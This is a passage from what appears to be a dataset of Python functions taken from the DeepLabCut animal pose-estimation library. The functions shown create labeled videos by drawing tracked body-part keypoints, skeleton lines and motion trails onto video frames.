                for (counter, index) in tqdm(enumerate(Index)):
                    frame = cap.read_frame(crop=True)
                    if frame is not None:
                        image = img_as_ubyte(cv2.resize(frame, None, fx=ratio, fy=ratio, interpolation=cv2.INTER_NEAREST))
                        if not allocated:
                            DATA = np.empty((nframes, np.shape(image)[0], np.shape(image)[1]))
                            allocated = True
                        DATA[counter, :, :] = np.mean(image, 2)
        print('Kmeans clustering ... (this might take a while)')
        data = DATA - DATA.mean(axis=0)
        data = data.reshape(nframes, -1)
        kmeans = MiniBatchKMeans(n_clusters=numframes2pick, tol=0.001, batch_size=batchsize, max_iter=max_iter)
        kmeans.fit(data)
        frames2pick = []
        for clusterid in range(numframes2pick):
            clusterids = np.where(clusterid == kmeans.labels_)[0]
            numimagesofcluster = len(clusterids)
            if numimagesofcluster > 0:
                frames2pick.append(Index[clusterids[np.random.randint(numimagesofcluster)]])
        return list(np.array(frames2pick))
    else:
        return list(Index)"
AlexEMG/DeepLabCut,get_segment_indices,"def get_segment_indices(bodyparts2connect, all_bpts):
    bpts2connect = []
    for (bpt1, bpt2) in bodyparts2connect:
        if bpt1 in all_bpts and bpt2 in all_bpts:
            bpts2connect.extend(zip(*(np.flatnonzero(all_bpts == bpt1), np.flatnonzero(all_bpts == bpt2))))
    return bpts2connect"
AlexEMG/DeepLabCut,CreateVideo,"def CreateVideo(clip, Dataframe, pcutoff, dotsize, colormap, bodyparts2plot, trailpoints, cropping, x1, x2, y1, y2, bodyparts2connect, skeleton_color, draw_skeleton, displaycropped, color_by, confidence_to_alpha=None):
    """"""Creating individual frames with labeled body parts and making a video""""""
    bpts = Dataframe.columns.get_level_values('bodyparts')
    all_bpts = bpts.values[::3]
    if draw_skeleton:
        color_for_skeleton = (np.array(mcolors.to_rgba(skeleton_color))[:3] * 255).astype(np.uint8)
        bpts2connect = get_segment_indices(bodyparts2connect, all_bpts)
    if displaycropped:
        (ny, nx) = (y2 - y1, x2 - x1)
    else:
        (ny, nx) = (clip.height(), clip.width())
    fps = clip.fps()
    if isinstance(fps, float):
        if fps * 1000 > 65535:
            fps = round(fps)
    nframes = clip.nframes
    duration = nframes / fps
    print('Duration of video [s]: {}, recorded with {} fps!'.format(round(duration, 2), round(fps, 2)))
    print('Overall # of frames: {} with cropped frame dimensions: {} {}'.format(nframes, nx, ny))
    print('Generating frames and creating video.')
    (df_x, df_y, df_likelihood) = Dataframe.values.reshape((len(Dataframe), -1, 3)).T
    if cropping and (not displaycropped):
        df_x += x1
        df_y += y1
    colorclass = plt.cm.ScalarMappable(cmap=colormap)
    bplist = bpts.unique().to_list()
    nbodyparts = len(bplist)
    if Dataframe.columns.nlevels == 3:
        nindividuals = int(len(all_bpts) / len(set(all_bpts)))
        map2bp = list(np.repeat(list(range(len(set(all_bpts)))), nindividuals))
        map2id = list(range(nindividuals)) * len(set(all_bpts))
    else:
        nindividuals = len(Dataframe.columns.get_level_values('individuals').unique())
        map2bp = [bplist.index(bp) for bp in all_bpts]
        nbpts_per_ind = Dataframe.groupby(level='individuals', axis=1).size().values // 3
        map2id = []
        for (i, j) in enumerate(nbpts_per_ind):
            map2id.extend([i] * j)
    keep = np.flatnonzero(np.isin(all_bpts, bodyparts2plot))
    bpts2color = [(ind, map2bp[ind], map2id[ind]) for ind in keep]
    if color_by == 'bodypart':
        C = colorclass.to_rgba(np.linspace(0, 1, nbodyparts))
    else:
        C = colorclass.to_rgba(np.linspace(0, 1, nindividuals))
    colors = (C[:, :3] * 255).astype(np.uint8)
    with np.errstate(invalid='ignore'):
        for index in trange(min(nframes, len(Dataframe))):
            image = clip.load_frame()
            if displaycropped:
                image = image[y1:y2, x1:x2]
            if draw_skeleton:
                for (bpt1, bpt2) in bpts2connect:
                    if np.all(df_likelihood[[bpt1, bpt2], index] > pcutoff) and (not (np.any(np.isnan(df_x[[bpt1, bpt2], index])) or np.any(np.isnan(df_y[[bpt1, bpt2], index])))):
                        (rr, cc, val) = line_aa(int(np.clip(df_y[bpt1, index], 0, ny - 1)), int(np.clip(df_x[bpt1, index], 0, nx - 1)), int(np.clip(df_y[bpt2, index], 1, ny - 1)), int(np.clip(df_x[bpt2, index], 1, nx - 1)))
                        image[rr, cc] = color_for_skeleton
            for (ind, num_bp, num_ind) in bpts2color:
                if df_likelihood[ind, index] > pcutoff:
                    if color_by == 'bodypart':
                        color = colors[num_bp]
                    else:
                        color = colors[num_ind]
                    if trailpoints > 0:
                        for k in range(1, min(trailpoints, index + 1)):
                            (rr, cc) = disk((df_y[ind, index - k], df_x[ind, index - k]), dotsize, shape=(ny, nx))
                            image[rr, cc] = color
                    (rr, cc) = disk((df_y[ind, index], df_x[ind, index]), dotsize, shape=(ny, nx))
                    alpha = 1
                    if confidence_to_alpha is not None:
                        alpha = confidence_to_alpha(df_likelihood[ind, index])
                    set_color(image, (rr, cc), color, alpha)
            clip.save_frame(image)
    clip.close()"
AlexEMG/DeepLabCut,CreateVideoSlow,"def CreateVideoSlow(videooutname, clip, Dataframe, tmpfolder, dotsize, colormap, alphavalue, pcutoff, trailpoints, cropping, x1, x2, y1, y2, save_frames, bodyparts2plot, outputframerate, Frames2plot, bodyparts2connect, skeleton_color, draw_skeleton, displaycropped, color_by):
    """"""Creating individual frames with labeled body parts and making a video""""""
    if displaycropped:
        (ny, nx) = (y2 - y1, x2 - x1)
    else:
        (ny, nx) = (clip.height(), clip.width())
    fps = clip.fps()
    if outputframerate is None:
        outputframerate = fps
    nframes = clip.nframes
    duration = nframes / fps
    print('Duration of video [s]: {}, recorded with {} fps!'.format(round(duration, 2), round(fps, 2)))
    print('Overall # of frames: {} with cropped frame dimensions: {} {}'.format(nframes, nx, ny))
    print('Generating frames and creating video.')
    (df_x, df_y, df_likelihood) = Dataframe.values.reshape((len(Dataframe), -1, 3)).T
    if cropping and (not displaycropped):
        df_x += x1
        df_y += y1
    bpts = Dataframe.columns.get_level_values('bodyparts')
    all_bpts = bpts.values[::3]
    if draw_skeleton:
        bpts2connect = get_segment_indices(bodyparts2connect, all_bpts)
    bplist = bpts.unique().to_list()
    nbodyparts = len(bplist)
    if Dataframe.columns.nlevels == 3:
        nindividuals = int(len(all_bpts) / len(set(all_bpts)))
        map2bp = list(np.repeat(list(range(len(set(all_bpts)))), nindividuals))
        map2id = list(range(nindividuals)) * len(set(all_bpts))
    else:
        nindividuals = len(Dataframe.columns.get_level_values('individuals').unique())
        map2bp = [bplist.index(bp) for bp in all_bpts]
        nbpts_per_ind = Dataframe.groupby(level='individuals', axis=1).size().values // 3
        map2id = []
        for (i, j) in enumerate(nbpts_per_ind):
            map2id.extend([i] * j)
    keep = np.flatnonzero(np.isin(all_bpts, bodyparts2plot))
    bpts2color = [(ind, map2bp[ind], map2id[ind]) for ind in keep]
    if color_by == 'individual':
        colors = visualization.get_cmap(nindividuals, name=colormap)
    else:
        colors = visualization.get_cmap(nbodyparts, name=colormap)
    nframes_digits = int(np.ceil(np.log10(nframes)))
    if nframes_digits > 9:
        raise Exception('Your video has more than 10**9 frames, we recommend chopping it up.')
    if Frames2plot is None:
        Index = set(range(nframes))
    else:
        Index = {int(k) for k in Frames2plot if 0 <= k < nframes}
    prev_backend = plt.get_backend()
    plt.switch_backend('agg')
    dpi = 100
    fig = plt.figure(frameon=False, figsize=(nx / dpi, ny / dpi))
    ax = fig.add_subplot(111)
    writer = FFMpegWriter(fps=outputframerate, codec='h264')
    with writer.saving(fig, videooutname, dpi=dpi), np.errstate(invalid='ignore'):
        for index in trange(min(nframes, len(Dataframe))):
            imagename = tmpfolder + '/file' + str(index).zfill(nframes_digits) + '.png'
            image = img_as_ubyte(clip.load_frame())
            if index in Index:
                if cropping and displaycropped:
                    image = image[y1:y2, x1:x2]
                ax.imshow(image)
                if draw_skeleton:
                    for (bpt1, bpt2) in bpts2connect:
                        if np.all(df_likelihood[[bpt1, bpt2], index] > pcutoff):
                            ax.plot([df_x[bpt1, index], df_x[bpt2, index]], [df_y[bpt1, index], df_y[bpt2, index]], color=skeleton_color, alpha=alphavalue)
                for (ind, num_bp, num_ind) in bpts2color:
                    if df_likelihood[ind, index] > pcutoff:
                        if color_by == 'bodypart':
                            color = colors(num_bp)
                        else:
                            color = colors(num_ind)
                        if trailpoints > 0:
                            ax.scatter(df_x[ind][max(0, index - trailpoints):index], df_y[ind][max(0, index - trailpoints):index], s=dotsize ** 2, color=color, alpha=alphavalue * 0.75)
                        ax.scatter(df_x[ind, index], df_y[ind, index], s=dotsize ** 2, color=color, alpha=alphavalue)
                ax.set_xlim(0, nx)
                ax.set_ylim(0, ny)
                ax.axis('off')
                ax.invert_yaxis()
                fig.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
                if save_frames:
                    fig.savefig(imagename)
                writer.grab_frame()
                ax.clear()
    print('Labeled video {} successfully created.'.format(videooutname))
    plt.switch_backend(prev_backend)"
AlexEMG/DeepLabCut,create_labeled_video,"def create_labeled_video(config, videos, videotype='', shuffle=1, trainingsetindex=0, filtered=False, fastmode=True, save_frames=False, keypoints_only=False, Frames2plot=None, displayedbodyparts='all', displayedindividuals='all', codec='mp4v', outputframerate=None, destfolder=None, draw_skeleton=False, trailpoints=0, displaycropped=False, color_by='bodypart', modelprefix='', init_weights='', track_method='', superanimal_name='', pcutoff=0.6, skeleton=[], skeleton_color='white', dotsize=8, colormap='rainbow', alphavalue=0.5, overwrite=False, confidence_to_alpha: Union[bool, Callable[[float], float]]=False):
    """"""Labels the bodyparts in a video.

    Make sure the video is already analyzed by the function
    ``deeplabcut.analyze_videos``.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file.

    videos : list[str]
        A list of strings containing the full paths to videos for analysis or a path
        to the directory, where all the videos with same extension are stored.

    videotype: str, optional, default=""""
        Checks for the extension of the video in case the input to the video is a
        directory. Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions
        ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    shuffle : int, optional, default=1
        Number of shuffles of training dataset.

    trainingsetindex: int, optional, default=0
        Integer specifying which TrainingsetFraction to use.
        Note that TrainingFraction is a list in config.yaml.

    filtered: bool, optional, default=False
        Boolean variable indicating if filtered output should be plotted rather than
        frame-by-frame predictions. Filtered version can be calculated with
        ``deeplabcut.filterpredictions``.

    fastmode: bool, optional, default=True
        If ``True``, uses openCV (much faster but less customization of video) instead
        of matplotlib if ``False``. You can also ""save_frames"" individually or not in
        the matplotlib mode (if you set the ""save_frames"" variable accordingly).
        However, using matplotlib to create the frames it therefore allows much more
        flexible (one can set transparency of markers, crop, and easily customize).

    save_frames: bool, optional, default=False
        If ``True``, creates each frame individual and then combines into a video.
        Setting this to ``True`` is relatively slow as it stores all individual frames.

    keypoints_only: bool, optional, default=False
        By default, both video frames and keypoints are visible. If ``True``, only the
        keypoints are shown. These clips are an hommage to Johansson movies,
        see https://www.youtube.com/watch?v=1F5ICP9SYLU and of course his seminal
        paper: ""Visual perception of biological motion and a model for its analysis""
        by Gunnar Johansson in Perception & Psychophysics 1973.

    Frames2plot: List[int] or None, optional, default=None
        If not ``None`` and ``save_frames=True`` then the frames corresponding to the
        index will be plotted. For example, ``Frames2plot=[0,11]`` will plot the first
        and the 12th frame.

    displayedbodyparts: list[str] or str, optional, default=""all""
        This selects the body parts that are plotted in the video. If ``all``, then all
        body parts from config.yaml are used. If a list of strings that are a subset of
        the full list. E.g. ['hand','Joystick'] for the demo
        Reaching-Mackenzie-2018-08-30/config.yaml to select only these body parts.

    displayedindividuals: list[str] or str, optional, default=""all""
        Individuals plotted in the video.
        By default, all individuals present in the config will be showed.

    codec: str, optional, default=""mp4v""
        Codec for labeled video. For available options, see
        http://www.fourcc.org/codecs.php. Note that this depends on your ffmpeg
        installation.

    outputframerate: int or None, optional, default=None
        Positive number, output frame rate for labeled video (only available for the
        mode with saving frames.) If ``None``, which results in the original video
        rate.

    destfolder: string or None, optional, default=None
        Specifies the destination folder that was used for storing analysis data. If
        ``None``, the path of the video file is used.

    draw_skeleton: bool, optional, default=False
        If ``True`` adds a line connecting the body parts making a skeleton on each
        frame. The body parts to be connected and the color of these connecting lines
        are specified in the config file.

    trailpoints: int, optional, default=0
        Number of previous frames whose body parts are plotted in a frame
        (for displaying history).

    displaycropped: bool, optional, default=False
        Specifies whether only cropped frame is displayed (with labels analyzed
        therein), or the original frame with the labels analyzed in the cropped subset.

    color_by : string, optional, default='bodypart'
        Coloring rule. By default, each bodypart is colored differently.
        If set to 'individual', points belonging to a single individual are colored the
        same.

    modelprefix: str, optional, default=""""
        Directory containing the deeplabcut models to use when evaluating the network.
        By default, the models are assumed to exist in the project folder.

    init_weights: str,
        Checkpoint path to the super model

    track_method: string, optional, default=""""
        Specifies the tracker used to generate the data.
        Empty by default (corresponding to a single animal project).
        For multiple animals, must be either 'box', 'skeleton', or 'ellipse' and will
        be taken from the config.yaml file if none is given.

    overwrite: bool, optional, default=False
        If ``True`` overwrites existing labeled videos.

    confidence_to_alpha: Union[bool, Callable[[float], float], default=False
        If False, all keypoints will be plot with alpha=1. Otherwise, this can be
        defined as a function f: [0, 1] -> [0, 1] such that the alpha value for a
        keypoint will be set as a function of its score: alpha = f(score). The default
        function used when True is f(x) = max(0, (x - pcutoff)/(1 - pcutoff)).

    Returns
    -------
        results : list[bool]
        ``True`` if the video is successfully created for each item in ``videos``.

    Examples
    --------

    Create the labeled video for a single video

    >>> deeplabcut.create_labeled_video(
            '/analysis/project/reaching-task/config.yaml',
            ['/analysis/project/videos/reachingvideo1.avi'],
        )

    Create the labeled video for a single video and store the individual frames

    >>> deeplabcut.create_labeled_video(
            '/analysis/project/reaching-task/config.yaml',
            ['/analysis/project/videos/reachingvideo1.avi'],
            fastmode=True,
            save_frames=True,
        )

    Create the labeled video for multiple videos

    >>> deeplabcut.create_labeled_video(
            '/analysis/project/reaching-task/config.yaml',
            [
                '/analysis/project/videos/reachingvideo1.avi',
                '/analysis/project/videos/reachingvideo2.avi',
            ],
        )

    Create the labeled video for all the videos with an .avi extension in a directory.

    >>> deeplabcut.create_labeled_video(
            '/analysis/project/reaching-task/config.yaml',
            ['/analysis/project/videos/'],
        )

    Create the labeled video for all the videos with an .mp4 extension in a directory.

    >>> deeplabcut.create_labeled_video(
            '/analysis/project/reaching-task/config.yaml',
            ['/analysis/project/videos/'],
            videotype='mp4',
        )
    """"""
    if config == '':
        pass
    else:
        cfg = auxiliaryfunctions.read_config(config)
        trainFraction = cfg['TrainingFraction'][trainingsetindex]
        track_method = auxfun_multianimal.get_track_method(cfg, track_method=track_method)
    if init_weights == '':
        (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.GetScorerName(cfg, shuffle, trainFraction, modelprefix=modelprefix)
    else:
        DLCscorer = 'DLC_' + Path(init_weights).stem
        DLCscorerlegacy = 'DLC_' + Path(init_weights).stem
    if save_frames:
        fastmode = False
        keypoints_only = False
    if isinstance(confidence_to_alpha, bool):
        confidence_to_alpha = _get_default_conf_to_alpha(confidence_to_alpha, pcutoff)
    if superanimal_name != '':
        dlc_root_path = auxiliaryfunctions.get_deeplabcut_path()
        supermodels = parse_available_supermodels()
        test_cfg = load_config(os.path.join(dlc_root_path, 'pose_estimation_tensorflow', 'superanimal_configs', supermodels[superanimal_name]))
        bodyparts = test_cfg['all_joints_names']
        cfg = {'skeleton': skeleton, 'skeleton_color': skeleton_color, 'pcutoff': pcutoff, 'dotsize': dotsize, 'alphavalue': alphavalue, 'colormap': colormap}
    else:
        bodyparts = auxiliaryfunctions.intersection_of_body_parts_and_ones_given_by_user(cfg, displayedbodyparts)
    individuals = auxfun_multianimal.IntersectionofIndividualsandOnesGivenbyUser(cfg, displayedindividuals)
    if draw_skeleton:
        bodyparts2connect = cfg['skeleton']
        if displayedbodyparts != 'all':
            bodyparts2connect = [pair for pair in bodyparts2connect if all((element in displayedbodyparts for element in pair))]
        skeleton_color = cfg['skeleton_color']
    else:
        bodyparts2connect = None
        skeleton_color = None
    start_path = os.getcwd()
    Videos = auxiliaryfunctions.get_list_of_videos(videos, videotype)
    if not Videos:
        return []
    func = partial(proc_video, videos, destfolder, filtered, DLCscorer, DLCscorerlegacy, track_method, cfg, individuals, color_by, bodyparts, codec, bodyparts2connect, trailpoints, save_frames, outputframerate, Frames2plot, draw_skeleton, skeleton_color, displaycropped, fastmode, keypoints_only, overwrite, init_weights=init_weights, confidence_to_alpha=confidence_to_alpha)
    if get_start_method() == 'fork':
        with Pool(min(os.cpu_count(), len(Videos))) as pool:
            results = pool.map(func, Videos)
    else:
        results = []
        for video in Videos:
            results.append(func(video))
    os.chdir(start_path)
    return results"
AlexEMG/DeepLabCut,proc_video,"def proc_video(videos, destfolder, filtered, DLCscorer, DLCscorerlegacy, track_method, cfg, individuals, color_by, bodyparts, codec, bodyparts2connect, trailpoints, save_frames, outputframerate, Frames2plot, draw_skeleton, skeleton_color, displaycropped, fastmode, keypoints_only, overwrite, video, init_weights='', confidence_to_alpha: Optional[Callable[[float], float]]=None):
    """"""Helper function for create_videos

    Parameters
    ----------


    Returns
    -------
        result : bool
        ``True`` if a video is successfully created.
    """"""
    videofolder = Path(video).parents[0]
    if destfolder is None:
        destfolder = videofolder
    auxiliaryfunctions.attempt_to_make_folder(destfolder)
    os.chdir(destfolder)
    print('Starting to process video: {}'.format(video))
    vname = str(Path(video).stem)
    if init_weights != '':
        DLCscorer = 'DLC_' + Path(init_weights).stem
        DLCscorerlegacy = 'DLC_' + Path(init_weights).stem
    if filtered:
        videooutname1 = os.path.join(vname + DLCscorer + 'filtered_labeled.mp4')
        videooutname2 = os.path.join(vname + DLCscorerlegacy + 'filtered_labeled.mp4')
    else:
        videooutname1 = os.path.join(vname + DLCscorer + '_labeled.mp4')
        videooutname2 = os.path.join(vname + DLCscorerlegacy + '_labeled.mp4')
    if (os.path.isfile(videooutname1) or os.path.isfile(videooutname2)) and (not overwrite):
        print('Labeled video {} already created.'.format(vname))
        return True
    else:
        print('Loading {} and data.'.format(video))
        try:
            (df, filepath, _, _) = auxiliaryfunctions.load_analyzed_data(destfolder, vname, DLCscorer, filtered, track_method)
            metadata = auxiliaryfunctions.load_video_metadata(destfolder, vname, DLCscorer)
            if cfg.get('multianimalproject', False):
                s = '_id' if color_by == 'individual' else '_bp'
            else:
                s = ''
            videooutname = filepath.replace('.h5', f'{s}_labeled.mp4')
            if os.path.isfile(videooutname) and (not overwrite):
                print('Labeled video already created. Skipping...')
                return
            if all(individuals):
                df = df.loc(axis=1)[:, individuals]
            cropping = metadata['data']['cropping']
            [x1, x2, y1, y2] = metadata['data']['cropping_parameters']
            labeled_bpts = [bp for bp in df.columns.get_level_values('bodyparts').unique() if bp in bodyparts]
            if keypoints_only:
                mask = df.columns.get_level_values('bodyparts').isin(bodyparts)
                df.loc[:, ~mask] = np.nan
                inds = None
                if bodyparts2connect:
                    all_bpts = df.columns.get_level_values('bodyparts')[::3]
                    inds = get_segment_indices(bodyparts2connect, all_bpts)
                clip = vp(fname=video, fps=outputframerate)
                create_video_with_keypoints_only(df, videooutname, inds, cfg['pcutoff'], cfg['dotsize'], cfg['alphavalue'], skeleton_color=skeleton_color, color_by=color_by, colormap=cfg['colormap'], fps=clip.fps())
                clip.close()
            elif not fastmode:
                tmpfolder = os.path.join(str(videofolder), 'temp-' + vname)
                if save_frames:
                    auxiliaryfunctions.attempt_to_make_folder(tmpfolder)
                clip = vp(video)
                CreateVideoSlow(videooutname, clip, df, tmpfolder, cfg['dotsize'], cfg['colormap'], cfg['alphavalue'], cfg['pcutoff'], trailpoints, cropping, x1, x2, y1, y2, save_frames, labeled_bpts, outputframerate, Frames2plot, bodyparts2connect, skeleton_color, draw_skeleton, displaycropped, color_by)
                clip.close()
            else:
                _create_labeled_video(video, filepath, keypoints2show=labeled_bpts, animals2show=individuals, bbox=(x1, x2, y1, y2), codec=codec, output_path=videooutname, pcutoff=cfg['pcutoff'], dotsize=cfg['dotsize'], cmap=cfg['colormap'], color_by=color_by, skeleton_edges=bodyparts2connect, skeleton_color=skeleton_color, trailpoints=trailpoints, fps=outputframerate, display_cropped=displaycropped, confidence_to_alpha=confidence_to_alpha)
            return True
        except FileNotFoundError as e:
            print(e)
            return False"
AlexEMG/DeepLabCut,_create_labeled_video,"def _create_labeled_video(video, h5file, keypoints2show='all', animals2show='all', skeleton_edges=None, pcutoff=0.6, dotsize=8, cmap='cool', color_by='bodypart', skeleton_color='k', trailpoints=0, bbox=None, display_cropped=False, codec='mp4v', fps=None, output_path='', confidence_to_alpha=None):
    if color_by not in ('bodypart', 'individual'):
        raise ValueError(""`color_by` should be either 'bodypart' or 'individual'."")
    if not output_path:
        s = '_id' if color_by == 'individual' else '_bp'
        output_path = h5file.replace('.h5', f'{s}_labeled.mp4')
    (x1, x2, y1, y2) = bbox
    if display_cropped:
        sw = x2 - x1
        sh = y2 - y1
    else:
        sw = sh = ''
    clip = vp(fname=video, sname=output_path, codec=codec, sw=sw, sh=sh, fps=fps)
    cropping = bbox != (0, clip.w, 0, clip.h)
    df = pd.read_hdf(h5file)
    try:
        animals = df.columns.get_level_values('individuals').unique().to_list()
        if animals2show != 'all' and isinstance(animals, Iterable):
            animals = [a for a in animals if a in animals2show]
        df = df.loc(axis=1)[:, animals]
    except KeyError:
        pass
    kpts = df.columns.get_level_values('bodyparts').unique().to_list()
    if keypoints2show != 'all' and isinstance(keypoints2show, Iterable):
        kpts = [kpt for kpt in kpts if kpt in keypoints2show]
    CreateVideo(clip, df, pcutoff, dotsize, cmap, kpts, trailpoints, cropping, x1, x2, y1, y2, skeleton_edges, skeleton_color, bool(skeleton_edges), display_cropped, color_by, confidence_to_alpha=confidence_to_alpha)"
AlexEMG/DeepLabCut,create_video_with_keypoints_only,"def create_video_with_keypoints_only(df, output_name, ind_links=None, pcutoff=0.6, dotsize=8, alpha=0.7, background_color='k', skeleton_color='navy', color_by='bodypart', colormap='viridis', fps=25, dpi=200, codec='h264'):
    bodyparts = df.columns.get_level_values('bodyparts')[::3]
    bodypart_names = bodyparts.unique()
    n_bodyparts = len(bodypart_names)
    nx = int(np.nanmax(df.xs('x', axis=1, level='coords')))
    ny = int(np.nanmax(df.xs('y', axis=1, level='coords')))
    n_frames = df.shape[0]
    xyp = df.values.reshape((n_frames, -1, 3))
    if color_by == 'bodypart':
        map_ = bodyparts.map(dict(zip(bodypart_names, range(n_bodyparts))))
        cmap = plt.get_cmap(colormap, n_bodyparts)
    elif color_by == 'individual':
        try:
            individuals = df.columns.get_level_values('individuals')[::3]
            individual_names = individuals.unique().to_list()
            n_individuals = len(individual_names)
            map_ = individuals.map(dict(zip(individual_names, range(n_individuals))))
            cmap = plt.get_cmap(colormap, n_individuals)
        except KeyError as e:
            raise Exception('Coloring by individuals is only valid for multi-animal data') from e
    else:
        raise ValueError(f'Invalid color_by={color_by}')
    prev_backend = plt.get_backend()
    plt.switch_backend('agg')
    fig = plt.figure(frameon=False, figsize=(nx / dpi, ny / dpi))
    ax = fig.add_subplot(111)
    scat = ax.scatter([], [], s=dotsize ** 2, alpha=alpha)
    coords = xyp[0, :, :2]
    coords[xyp[0, :, 2] < pcutoff] = np.nan
    scat.set_offsets(coords)
    colors = cmap(map_)
    scat.set_color(colors)
    segs = coords[tuple(zip(*tuple(ind_links))), :].swapaxes(0, 1) if ind_links else []
    coll = LineCollection(segs, colors=skeleton_color, alpha=alpha)
    ax.add_collection(coll)
    ax.set_xlim(0, nx)
    ax.set_ylim(0, ny)
    ax.axis('off')
    ax.add_patch(plt.Rectangle((0, 0), 1, 1, facecolor=background_color, transform=ax.transAxes, zorder=-1))
    ax.invert_yaxis()
    plt.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
    writer = FFMpegWriter(fps=fps, codec=codec)
    with writer.saving(fig, output_name, dpi=dpi):
        writer.grab_frame()
        for (index, _) in enumerate(trange(n_frames - 1), start=1):
            coords = xyp[index, :, :2]
            coords[xyp[index, :, 2] < pcutoff] = np.nan
            scat.set_offsets(coords)
            if ind_links:
                segs = coords[tuple(zip(*tuple(ind_links))), :].swapaxes(0, 1)
            coll.set_segments(segs)
            writer.grab_frame()
    plt.close(fig)
    plt.switch_backend(prev_backend)"
AlexEMG/DeepLabCut,create_video_with_all_detections,"def create_video_with_all_detections(config, videos, videotype='', shuffle=1, trainingsetindex=0, displayedbodyparts='all', cropping: Optional[List[int]]=None, destfolder=None, modelprefix='', confidence_to_alpha: Union[bool, Callable[[float], float]]=False):
    """"""
    Create a video labeled with all the detections stored in a '*_full.pickle' file.

    Parameters
    ----------
    config : str
        Absolute path to the config.yaml file

    videos : list of str
        A list of strings containing the full paths to videos for analysis or a path to the directory,
        where all the videos with same extension are stored.

    videotype: string, optional
        Checks for the extension of the video in case the input to the video is a directory.
 Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    shuffle : int, optional
        Number of shuffles of training dataset. Default is set to 1.

    trainingsetindex: int, optional
        Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml).

    displayedbodyparts: list of strings, optional
        This selects the body parts that are plotted in the video. Either ``all``, then all body parts
        from config.yaml are used orr a list of strings that are a subset of the full list.
        E.g. ['hand','Joystick'] for the demo Reaching-Mackenzie-2018-08-30/config.yaml to select only these two body parts.

    cropping: list[int], optional (default=None)
        If passed in, the [x1, x2, y1, y2] crop coordinates are used to shift detections appropriately.

    destfolder: string, optional
        Specifies the destination folder that was used for storing analysis data (default is the path of the video).

    confidence_to_alpha: Union[bool, Callable[[float], float], default=False
        If False, all keypoints will be plot with alpha=1. Otherwise, this can be
        defined as a function f: [0, 1] -> [0, 1] such that the alpha value for a
        keypoint will be set as a function of its score: alpha = f(score). The default
        function used when True is f(x) = x.
    """"""
    from deeplabcut.pose_estimation_tensorflow.lib.inferenceutils import Assembler
    import re
    cfg = auxiliaryfunctions.read_config(config)
    trainFraction = cfg['TrainingFraction'][trainingsetindex]
    (DLCscorername, _) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, modelprefix=modelprefix)
    videos = auxiliaryfunctions.get_list_of_videos(videos, videotype)
    if not videos:
        return
    if isinstance(confidence_to_alpha, bool):
        confidence_to_alpha = _get_default_conf_to_alpha(confidence_to_alpha, 0)
    for video in videos:
        videofolder = os.path.splitext(video)[0]
        if destfolder is None:
            outputname = '{}_full.mp4'.format(videofolder + DLCscorername)
            full_pickle = os.path.join(videofolder + DLCscorername + '_full.pickle')
        else:
            auxiliaryfunctions.attempt_to_make_folder(destfolder)
            outputname = os.path.join(destfolder, str(Path(video).stem) + DLCscorername + '_full.mp4')
            full_pickle = os.path.join(destfolder, str(Path(video).stem) + DLCscorername + '_full.pickle')
        if not os.path.isfile(outputname):
            video_name = str(Path(video).stem)
            print('Creating labeled video for ', video_name)
            h5file = full_pickle.replace('_full.pickle', '.h5')
            (data, _) = auxfun_multianimal.LoadFullMultiAnimalData(h5file)
            data = dict(data)
            header = data.pop('metadata')
            all_jointnames = header['all_joints_names']
            if displayedbodyparts == 'all':
                numjoints = len(all_jointnames)
                bpts = range(numjoints)
            else:
                bpts = []
                for (bptindex, bp) in enumerate(all_jointnames):
                    if bp in displayedbodyparts:
                        bpts.append(bptindex)
                numjoints = len(bpts)
            frame_names = list(data)
            frames = [int(re.findall('\\d+', name)[0]) for name in frame_names]
            colorclass = plt.cm.ScalarMappable(cmap=cfg['colormap'])
            C = colorclass.to_rgba(np.linspace(0, 1, numjoints))
            colors = (C[:, :3] * 255).astype(np.uint8)
            pcutoff = cfg['pcutoff']
            dotsize = cfg['dotsize']
            clip = vp(fname=video, sname=outputname, codec='mp4v')
            (ny, nx) = (clip.height(), clip.width())
            x1 = 0
            y1 = 0
            if cropping is not None:
                (x1, _, y1, _) = cropping
            for n in trange(clip.nframes):
                frame = clip.load_frame()
                if frame is None:
                    continue
                try:
                    ind = frames.index(n)
                    dets = Assembler._flatten_detections(data[frame_names[ind]])
                    for det in dets:
                        if det.label not in bpts or det.confidence < pcutoff:
                            continue
                        (x, y) = det.pos
                        x += x1
                        y += y1
                        (rr, cc) = disk((y, x), dotsize, shape=(ny, nx))
                        alpha = 1
                        if confidence_to_alpha is not None:
                            alpha = confidence_to_alpha(det.confidence)
                        set_color(frame, (rr, cc), colors[bpts.index(det.label)], alpha)
                except ValueError as err:
                    print(n, f'no data: {err}')
                    pass
                try:
                    clip.save_frame(frame)
                except:
                    print(n, 'frame writing error.')
                    pass
            clip.close()
        else:
            print('Detections already plotted, ', outputname)"
AlexEMG/DeepLabCut,_create_video_from_tracks,"def _create_video_from_tracks(video, tracks, destfolder, output_name, pcutoff, scale=1):
    import subprocess
    from tqdm import tqdm
    if not os.path.isdir(destfolder):
        os.mkdir(destfolder)
    vid = VideoWriter(video)
    nframes = len(vid)
    strwidth = int(np.ceil(np.log10(nframes)))
    (nx, ny) = vid.dimensions
    X2 = nx
    X1 = 0
    numtracks = len(tracks.keys()) - 1
    trackids = [t for t in tracks.keys() if t != 'header']
    cc = np.random.rand(numtracks + 1, 3)
    (fig, ax) = visualization.prepare_figure_axes(nx, ny, scale)
    im = ax.imshow(np.zeros((ny, nx)))
    markers = sum([ax.plot([], [], '.', c=c) for c in cc], [])
    for index in tqdm(range(nframes)):
        vid.set_to_frame(index)
        imname = 'frame' + str(index).zfill(strwidth)
        image_output = os.path.join(destfolder, imname + '.png')
        frame = vid.read_frame()
        if frame is not None and (not os.path.isfile(image_output)):
            im.set_data(frame[:, X1:X2])
            for (n, trackid) in enumerate(trackids):
                if imname in tracks[trackid]:
                    (x, y, p) = tracks[trackid][imname].reshape((-1, 3)).T
                    markers[n].set_data(x[p > pcutoff], y[p > pcutoff])
                else:
                    markers[n].set_data([], [])
